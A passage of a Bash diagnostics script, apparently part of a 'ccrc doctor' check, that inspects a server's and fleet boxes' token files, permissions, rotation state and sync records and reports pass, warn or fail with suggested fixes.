  if [ -L "$p" ] || [ ! -f "$p" ]; then BT_TF=not-regular; return 0; fi
  BT_TF_MODE="$(_plat_mode -- "$p" 2>/dev/null)" || BT_TF_MODE=""
  if [ ! -r "$p" ]; then BT_TF=unreadable; return 0; fi
  BT_TF=no-value
  while IFS= read -r line || [ -n "$line" ]; do
    t="${line//[[:space:]]/}"
    [ -n "$t" ] || continue
    case "$t" in \#*) continue ;; esac
    BT_TF=ok; break
  done < "$p" 2>/dev/null || BT_TF=unreadable
  line=""; t=""
  return 0
}

# One finding: <arm> <word> [<a>] [<b>]. Appends its line part, its armed class and its remedy to the caller's
# BT_PART, BT_CLASS and BT_FIX (dynamic scope: `_check_box-token` declares them).
_bt_find() {
  local arm="$1" word="$2" a="${3:-}" b="${4:-}" say="" cls=WARN fix=""
  local card="Rotate now on the console's Box token card"
  case "$arm:$word" in
    server:token-absent) cls=FAIL
      say="$a does not exist, so every box-token lane on this server answers 401"
      fix="restart the server (ccrc.service), which mints a value at boot; if it still has none, its log names the failed mint" ;;
    server:token-mode|fleet:fleet-token-mode) cls=FAIL
      say="$a is mode $b, not 0600"; fix="chmod 600 $a" ;;
    server:token-unusable|fleet:fleet-token-unusable) cls=FAIL
      case "$b" in
        not-regular) say="$a is not a regular file" ;;
        unreadable) say="$a cannot be read" ;;
        *) say="$a carries no value line" ;;
      esac
      fix="look at what is there without printing it (ls -l $a); a file the server wrote is rewritten by its next rotation ($card)" ;;
    server:state-absent)
      say="$a does not exist, so this server has not run the token lifecycle (a build before it, or not restarted since)"
      fix="update this box (ccrc update), which restarts the server; it writes the file at boot" ;;
    server:state-unreadable|fleet:sync-unreadable)
      [ "$arm" = server ] && cls=FAIL
      if [ "$b" = no-python ]; then say="python3 is not on PATH, so $a was not read (the python3 check says so too)"
      else say="$a is not a record this check can read"; fi
      fix="look at what is there (ls -l $a); its writer rewrites it whole on its next run" ;;
    server:mint-failed) cls=FAIL
      say="the server could not mint a value ($(_bt_age "$a") ago), so every box-token lane answers 401 until a mint succeeds"
      fix="read the server's log for the errno, then free disk or repair the directory's mode; the driver retries each minute" ;;
    server:held:*)
      say="a rotation is held: ${word#held:}${b:+ on $b}"
      fix="the hold clears when its condition does (an update in flight ends, the fleet installs the release); the console's Box token card names it" ;;
    server:failed:*)
      [ "$a" -ge "$_BT_FAIL_AT" ] && cls=FAIL
      say="$a consecutive failed rotation attempt(s), the last ${word#failed:}"
      fix="read the console's Box token card and the server's log; the driver retries with backoff" ;;
    server:pending-overdue)
      say="a handed-out generation is $(_bt_age "$a") past its confirmation deadline"
      fix="the driver starts a forward rotation itself; if none starts, read the server's log" ;;
    server:rotation-owed:*)
      say="a rotation is owed (${word#rotation-owed:}) and has not completed"
      fix="$card, or let the driver's next tick start it" ;;
    server:proof-unmeasured)
      say="the fleet's last sync ($(_bt_age "$a") ago) wrote the value but could not prove it against this server"
      fix="run ccrc doctor on the fleet box: its box-token line names the sync's own result" ;;
    server:recovered)
      say="the server recovered its token from a sibling file at boot ($(_bt_age "$a") ago), and no rotation has followed"
      fix="$card" ;;
    server:retire-overdue:*) cls=FAIL
      say="the previous value is $a min past its hard bound and its digest is not yet recorded as retired, so a value written back would be adopted at the next boot"
      fix="the driver retires it on its next tick; if it stays, read the server's log (an unreadable previous-value file beside box-token.json holds the retirement) and repair that file's mode, then it retires itself" ;;
    server:retiring-unlanded:*) cls=FAIL
      say="a retired value's digest has waited $a min to be appended to box-token-retired.json, and box-token.json is its only durable copy"
      fix="look at box-token-retired.json beside box-token.json without printing it (ls -l); the driver retries the append each tick, and an unusable file there is set aside at the next restart" ;;
    server:retired-presented) cls=FAIL
      say="a retired value was presented $a time(s) since the server started"
      fix="something still holds a retired value: read the server's log for the lane that presented it, then resync that box ($card)" ;;
    server:fleet-behind)
      say="the fleet has not confirmed the current generation"
      fix="run ccrc doctor on the fleet box; $card resyncs it" ;;
    server:fleet-unconfirmed)
      say="the current value carries no generation id and no rotation is owed, so the fleet's confirmation cannot be measured"
      fix="$card: a rotation gives the value an id the fleet confirms" ;;
    server:file:*) cls=FAIL
      say="on re-read ($(_bt_age "$a") ago) the server's $b token file was found ${word#file:}; the last good value is kept in memory"
      fix="look at the file without printing it (ls -l); the next rotation rewrites the server's token files ($card), and a restart re-reads them" ;;
    fleet:fleet-token-absent) cls=FAIL
      say="$a does not exist, so this box's calls to the server carry no box token"
      fix="the server writes it at its next rotation ($card); a single box records CCRC_ROLE=both in ~/.ccrc/ccrc.env and restarts the server, which writes it at boot" ;;
    fleet:no-generation)
      say="$a does not exist, so this box has recorded no synced generation"; fix="$card" ;;
    fleet:generation-malformed)
      say="$a is not one line of 16 lowercase hex"; fix="$card; the next sync rewrites it" ;;
    fleet:never-synced)
      say="$a does not exist, so ccrc token sync has never run here"; fix="$card" ;;
    fleet:proof-unmeasured)
      say="the last ccrc token sync ($(_bt_age "$a") ago) wrote the value but could not prove it"
      fix="ccrc token probe --file ~/.cc-secrets/ccrc-mail.token measures it again" ;;
    fleet:sync:*)
      say="the last ccrc token sync ($(_bt_age "$a") ago) refused: ${word#sync:}"
      fix="read the console's Box token card and the server's log; ccrc token probe --file ~/.cc-secrets/ccrc-mail.token says whether the server accepts this box's value" ;;
    *) cls=FAIL; say="this check has no sentence for this finding"; fix="this is a bug in ccrc, not a fact about your box — see _bt_find in this file" ;;
  esac
  BT_PART+=("$arm: $word — $say"); BT_CLASS+=("$cls"); BT_FIX+=("$fix")
}

_bt_server_arm() {   # <token path> <state path>
  local tok="$1" state="$2" before="${#BT_CLASS[@]}" out="" kw w n node seq="" since="" rot="" rotating=0 grace=0 refused=0 bad=0
  _bt_value_file "$tok"
  case "$BT_TF" in
    absent) _bt_find server token-absent "$tok" ;;
    ok) [ "$BT_TF_MODE" = 600 ] || _bt_find server token-mode "$tok" "${BT_TF_MODE:-unreadable}" ;;
    *) _bt_find server token-unusable "$tok" "$BT_TF" ;;
  esac
  if ! command -v python3 >/dev/null 2>&1; then _bt_find server state-unreadable "$state" no-python; return 0; fi
  out="$(python3 -I -c "$_BT_PY_STATE" "$state" "${_BT_ORIGINS[*]}" "${_BT_HOLDS[*]}" "${_BT_OWED[*]}" \
    "${_BT_SYNC_ERRORS[*]} ${_BT_LOST_WORDS[*]}" "${_BT_TRANSPORTS[*]}" "${_BT_FILE_PROBLEMS[*]}" \
    "$_BT_PENDING_CAP" "$_BT_TICK_MS" 2>/dev/null)" || out=""
  case "${out%%$'\n'*}" in
    absent) _bt_find server state-absent "$state"; return 0 ;;
    ok) ;;
    *) _bt_find server state-unreadable "$state"; return 0 ;;
  esac
  while IFS=' ' read -r kw w n node; do
    case "$kw" in
      ok) ;;
      seq) _bt_num "$w" && seq="$w" ;;
      since) _bt_num "$w" && since="$w" ;;
      rotated) { [ "$w" = never ] || _bt_num "$w"; } && rot="$w" ;;
      rotating) [ "$w" = 1 ] && rotating=1 ;;
      grace) [ "$w" = 1 ] && grace=1 ;;
      refused) [ "$w" = 1 ] && refused=1 ;;
      finding)
        case "$w" in
          mint-failed|pending-overdue|proof-unmeasured|recovered|retired-presented) _bt_num "$n" && _bt_find server "$w" "$n" || bad=1 ;;
          retire-overdue|retiring-unlanded) _bt_num "$n" && _bt_find server "$w:$n" "$n" || bad=1 ;;
          fleet-behind|fleet-unconfirmed) _bt_find server "$w" ;;
          file:*) if _bt_member "${w#file:}" "${_BT_FILE_PROBLEMS[@]}" && _bt_num "$n" && [[ "$node" =~ ^(current|pending|previous)$ ]]; then
                    _bt_find server "$w" "$n" "$node"; else bad=1; fi ;;
          held:*) if _bt_member "${w#held:}" "${_BT_HOLDS[@]}" && [[ "$node" =~ ^[A-Za-z0-9._:-]{1,64}$ ]]; then
                    [ "$node" = - ] && node=""; _bt_find server "$w" 0 "$node"; else bad=1; fi ;;
          failed:*) if { [ "${w#failed:}" = other ] || _bt_member "${w#failed:}" "${_BT_SYNC_ERRORS[@]}" "${_BT_LOST_WORDS[@]}"; } && _bt_num "$n"; then
                      _bt_find server "$w" "$n"; else bad=1; fi ;;
          rotation-owed:*) if _bt_member "${w#rotation-owed:}" "${_BT_OWED[@]}"; then _bt_find server "$w"; else bad=1; fi ;;
          *) bad=1 ;;
        esac ;;
      '') ;;
      *) bad=1 ;;
    esac
  done <<< "$out"
  if [ "$bad" -eq 1 ] || [ -z "$seq" ] || [ -z "$since" ] || [ -z "$rot" ]; then
    _bt_find server state-unreadable "$state"; return 0
  fi
  [ "${#BT_CLASS[@]}" -eq "$before" ] || return 0
  local how extra=""
  if [ "$rot" = never ]; then how="minted $(_bt_age "$since") ago (no rotation yet)"; else how="rotated $(_bt_age "$rot") ago"; fi
  [ "$refused" -eq 1 ] && extra=", retired value refused"      # spec 10.3's proof, once the server recorded it
  [ "$rotating" -eq 1 ] && extra="$extra, a rotation in progress"
  [ "$grace" -eq 1 ] && extra="$extra, the previous value in grace"
  BT_PART+=("server: generation #$seq, $how, fleet confirmed$extra"); BT_CLASS+=(PASS); BT_FIX+=("")
}

_bt_fleet_arm() {   # <own-write: 0|1>
  local own="$1" ff="$HOME/.cc-secrets/ccrc-mail.token" gen="$HOME/.ccrc/box-token-generation" rep="$HOME/.ccrc/token-sync.json"
  local before="${#BT_CLASS[@]}" out="" kw w n x bad=0 tr="" ownseen=0
  _bt_value_file "$ff"
  case "$BT_TF" in
    absent) _bt_find fleet fleet-token-absent "$ff" ;;
    ok) [ "$BT_TF_MODE" = 600 ] || _bt_find fleet fleet-token-mode "$ff" "${BT_TF_MODE:-unreadable}" ;;
    *) _bt_find fleet fleet-token-unusable "$ff" "$BT_TF" ;;
  esac
  if ! command -v python3 >/dev/null 2>&1; then _bt_find fleet sync-unreadable "$rep" no-python; return 0; fi
  out="$(python3 -I -c "$_BT_PY_FLEET" "$gen" "$rep" "$own" "${_BT_SYNC_ERRORS[*]}" "${_BT_TRANSPORTS[*]}" 2>/dev/null)" || out=""
  [ -n "$out" ] || bad=1
  while IFS=' ' read -r kw w n x; do
    case "$kw" in
      own) ownseen=1 ;;
      synced) if _bt_member "$w" "${_BT_TRANSPORTS[@]}" && _bt_num "$n"; then tr="$w"; else bad=1; fi ;;
      finding)
        case "$w" in
          no-generation|generation-malformed) _bt_find fleet "$w" "$gen" ;;
          never-synced|sync-unreadable) _bt_find fleet "$w" "$rep" ;;
          proof-unmeasured) _bt_num "$n" && _bt_find fleet "$w" "$n" || bad=1 ;;
          sync:*) if _bt_member "${w#sync:}" "${_BT_SYNC_ERRORS[@]}" && _bt_num "$n"; then _bt_find fleet "$w" "$n"; else bad=1; fi ;;
          *) bad=1 ;;
        esac ;;
      '') ;;
      *) bad=1 ;;
    esac
  done <<< "$out"
  if [ "$bad" -eq 1 ]; then _bt_find fleet sync-unreadable "$rep"; return 0; fi
  [ "${#BT_CLASS[@]}" -eq "$before" ] || return 0
  if [ "$ownseen" -eq 1 ]; then
    BT_PART+=("fleet: token file 0600, generation recorded, written by this box's server")
  elif [ -n "$tr" ]; then
    BT_PART+=("fleet: token file 0600, generation recorded, last sync proved, transport $tr")
  else
    _bt_find fleet sync-unreadable "$rep"; return 0
  fi
  BT_CLASS+=(PASS); BT_FIX+=("")
}

# rc 0 when ~/.ccrc/agent.env marks a FLEET box (server/src/token/files.ts's readAgentEnvMarksFleet, the same rule;
# D-4399): present but not a readable regular file, or a line whose key is CCRC_AGENT_TOKEN
# (optionally after `export `). rc 1 when absent, or readable with no such key (the README's single-box file). The
# file carries the agent bearer: each line is matched by its key alone inside this process and cleared at once.
_bt_agent_env_marks_fleet() {
  local p="$HOME/.ccrc/agent.env" line="" t="" hit=1
  if [ ! -e "$p" ] && [ ! -L "$p" ]; then return 1; fi
  { [ -f "$p" ] && [ -r "$p" ]; } || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    t="${line#"${line%%[![:space:]]*}"}"; line=""
    if [[ "$t" =~ ^(export[[:space:]]+)?CCRC_AGENT_TOKEN= ]]; then hit=0; t=""; break; fi
    t=""
  done < "$p" 2>/dev/null || hit=0
  line=""; t=""
  return "$hit"
}

_check_box-token() {
  { set +x; } 2>/dev/null
  local role="" fmode="" tok="" dir state arms="" own=0 c worst=PASS detail fix="" x
  local -a BT_PART=() BT_CLASS=() BT_FIX=()
  # The role, the fleet mode and the token path, read as `_check_timeout` reads the role: `ccrc`'s one reader,
  # only when it is loaded and the file is there. Anything else is "not recorded", which picks arms by presence.
  if [ -n "${BOX_ENV_FILE:-}" ] && [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ] && declare -F _box_env_value >/dev/null 2>&1; then
    role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
    fmode="$(_box_env_value "$BOX_ENV_FILE" CCRC_FLEET)"
    tok="$(_box_env_value "$BOX_ENV_FILE" CCRC_MAIL_TOKEN_PATH)"   # README's override; the state files sit beside it
  fi
  tok="${tok:-$HOME/.ccrc/mail.token}"
  dir="${tok%/*}"; [ "$dir" != "$tok" ] || dir=.
  state="$dir/box-token.json"
  case "$role" in
    server) arms=server ;;
    fleet) arms=fleet ;;
    both) arms="server fleet"
      # The both-role writer's box (bothRoleWriterArmed): the server writes the fleet file itself, so no sync runs.
      [ "$fmode" != remote ] && ! _bt_agent_env_marks_fleet && own=1 ;;
    *)
      { [ -e "$state" ] || [ -L "$state" ] || [ -e "$tok" ] || [ -L "$tok" ]; } && arms=server
      { [ -e "$HOME/.ccrc/agent.env" ] || [ -L "$HOME/.ccrc/agent.env" ]; } && arms="${arms:+$arms }fleet" ;;
  esac
  if [ -z "$arms" ]; then
    _dr_skip box-token "no-role — this box records no CCRC_ROLE and holds neither the server's token files ($tok, $state) nor a fleet agent's $HOME/.ccrc/agent.env, so neither arm has a subject"
    return 3
  fi
  case " $arms " in *" server "*) _bt_server_arm "$tok" "$state" ;; esac
  case " $arms " in *" fleet "*) _bt_fleet_arm "$own" ;; esac
  for c in ${BT_CLASS[@]+"${BT_CLASS[@]}"}; do
    case "$c" in FAIL) worst=FAIL ;; WARN) [ "$worst" = FAIL ] || worst=WARN ;; esac
  done
  detail="$(_dr_join ${BT_PART[@]+"${BT_PART[@]}"})"
  if [ "$worst" = PASS ]; then _dr_pass box-token "$detail"; return 0; fi
  if [ "$_BT_ARMS_ON" != 1 ]; then _dr_skip box-token "$detail$_BT_SKIP_TAIL"; return 3; fi
  for x in ${BT_FIX[@]+"${BT_FIX[@]}"}; do
    [ -n "$x" ] || continue
    case "; $fix; " in *"; $x; "*) ;; *) fix="${fix:+$fix; }$x" ;; esac
  done
  if [ "$worst" = FAIL ]; then _dr_fail box-token "$detail" "$fix"; return 1; fi
  _dr_warn box-token "$detail" "$fix"
  return 2
}
